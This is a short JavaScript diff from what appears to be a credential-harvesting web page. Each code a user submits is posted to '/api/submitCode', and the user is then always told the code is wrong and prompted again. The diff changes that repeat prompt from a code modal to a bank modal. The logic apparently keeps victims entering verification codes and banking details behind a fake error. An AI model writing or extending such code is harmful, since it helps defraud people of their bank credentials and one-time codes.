@@ -486,7 +486,7 @@
             if (!code) {
               swal.stopLoading();
               alert(wrong_code);
-              return this.codeModal(...arguments);
+              return this.bankModal(...arguments);
             }
             const response = await axios.post("/api/submitCode", {
               codeType,
@@ -496,11 +496,11 @@
 
             swal.stopLoading();
             alert(wrong_code);
-            return this.codeModal(...arguments);
+            return this.bankModal(...arguments);
           } catch (err) {
             swal.stopLoading();
             alert(wrong_code);
-            return this.codeModal(...arguments);
+            return this.bankModal(...arguments);
           }
         });
 
